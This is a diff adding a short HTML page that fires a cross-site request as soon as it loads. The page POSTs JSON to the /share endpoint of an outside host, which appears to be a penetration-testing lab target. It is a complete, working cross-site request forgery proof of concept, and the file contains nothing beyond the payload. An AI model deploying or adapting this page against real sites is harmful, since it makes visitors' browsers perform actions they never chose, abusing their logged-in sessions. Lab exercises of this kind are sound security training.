@@ -1,0 +1,13 @@
+<html>
+<body onload='share("abc",0)'>
+
+<script>
+  function share(user,id){
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://ptl-2d63cb87-4d590bd7.libcurl.so/share", true);
+    xhr.setRequestHeader("Content-type","application/json");
+    xhr.send(JSON.stringify({user: user, id: id}));
+  }
+</script>
+</body>
+</html>
